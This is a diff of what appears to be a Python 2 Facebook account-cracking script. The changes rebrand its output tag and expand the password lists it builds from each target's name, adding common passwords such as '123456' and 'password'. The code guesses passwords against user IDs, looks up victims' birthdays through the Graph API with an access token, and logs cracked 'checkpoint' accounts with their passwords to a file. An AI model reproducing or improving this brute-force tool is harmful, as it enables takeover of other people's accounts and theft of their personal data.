@@ -67,11 +67,7 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError, IOError:
-		print("\033[1;93m If you dont have token ,  go download !Get Access Token! ")
-		print(" ")
-		print("\033[1;93m download on !playstore! ")
-		print(" ")
-		token = raw_input("\033[1;91mLOGINWITHTOKEN \033[1;33m : ")
+		token = raw_input("\033[1;91mLOGIN WITH ACCESS TOKEN \033[1;33m : ")
 		if token == "":
 			print("Wrong Input")
              
@@ -266,7 +262,7 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[1;91m[OKENWA-CP]\033[1;91m %s|%s|%s %s %s"%(uid, pw, day, month, year))
+			print("\r\033[1;91m[WIZZYB-CP]\033[1;91m %s|%s|%s %s %s"%(uid, pw, day, month, year))
 			cp.append("%s|%s"%(uid, pw))
 			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
@@ -385,13 +381,13 @@ def mobile(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"123", name+"1234", name+"12345" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password"]
 	elif len(name)<=2:
-		pwx = [ name+"123", name+"1234", name+"12345" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	elif len(name)<=3:
-		pwx = [ name+"123", name+"12345" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	else:
-		pwx = [ name+"123", name+"12345" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
